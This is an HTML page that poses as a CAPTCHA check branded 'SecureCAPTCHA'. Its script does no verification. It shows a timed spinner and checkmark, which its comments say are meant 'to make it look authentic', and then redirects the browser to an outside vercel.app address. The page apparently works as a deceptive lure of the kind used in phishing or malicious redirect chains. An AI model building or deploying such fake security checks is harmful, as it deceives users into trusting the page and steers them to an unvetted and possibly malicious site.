<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Security Check</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <style>
    /* Base styles for perfect centering */
    html, body {
      height: 100%;
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
    }

    /* Background with professional blur effect */
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background-image: url("bg.jpg");
      background-size: cover;
      background-position: center;
      filter: blur(10px);
      transform: scale(1.1);
      z-index: -2;
    }

    body::after {
      content: "";
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.4);
      z-index: -1;
    }

    /* Captcha Box Styling */
    .captcha-container {
      width: 304px;
      height: 78px;
      background: #f9f9f9;
      border: 1px solid #d3d3d3;
      border-radius: 3px;
      padding: 10px 12px;
      box-sizing: border-box;
      display: flex;
      justify-content: space-between;
      align-items: center;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }

    .content-left {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .checkbox {
      width: 26px;
      height: 26px;
      border: 2px solid #c1c1c1;
      border-radius: 2px;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      background: white;
      transition: all 0.2s ease;
    }

    .checkbox:hover {
      border-color: #b2b2b2;
    }

    .checkbox.verified {
      border: none;
      background: transparent;
      color: #009688;
      font-size: 24px;
      cursor: default;
    }

    .status-text {
      font-size: 14px;
      color: #555;
      user-select: none;
    }

    .content-right {
      width: 80px;
      text-align: center;
      color: #777;
    }

    .logo img {
      width: 30px;
      height: 30px;
      display: block;
      margin: 0 auto;
    }

    .brand-name {
      font-size: 10px;
      font-weight: 600;
      margin-top: 2px;
    }

    .legal-links {
      font-size: 8px;
      margin-top: 2px;
    }

    /* Loading Spinner */
    .loading-spinner {
      width: 18px;
      height: 18px;
      border: 2px solid #f3f3f3;
      border-top: 2px solid #4285f4;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

<div class="captcha-container">
  <div class="content-left">
    <div class="checkbox" id="captchaBox" role="checkbox" aria-checked="false"></div>
    <div class="status-text" id="statusLabel">I'm not a robot</div>
  </div>

  <div class="content-right">
    <div class="logo">
      <img src="logo.png" alt="Captcha Logo">
    </div>
    <div class="brand-name">SecureCAPTCHA</div>
    <div class="legal-links">Privacy - Terms</div>
  </div>
</div>

<script>
  const captchaBox = document.getElementById("captchaBox");
  const statusLabel = document.getElementById("statusLabel");
  
  // Destination Link
  const targetDestination = "https://takealof-prome.vercel.app/";

  captchaBox.onclick = function () {
    // Prevent multiple clicks if already verified
    if (captchaBox.classList.contains("verified")) return;

    // 1. Start Visual Feedback (Loading)
    captchaBox.innerHTML = "<div class='loading-spinner'></div>";
    statusLabel.textContent = "Verifying...";

    // 2. Simulate analysis and redirect
    setTimeout(function () {
      // Switch spinner to Success Checkmark
      captchaBox.innerHTML = "âœ“";
      captchaBox.classList.add("verified");
      statusLabel.textContent = "Verification complete";
      statusLabel.style.color = "#009688";

      // Final redirect after a brief delay for UX
      setTimeout(function () {
        window.location.href = targetDestination;
      }, 800);

    }, 1500); // 1.5s delay to make it look authentic
  };
</script>

</body>
</html>
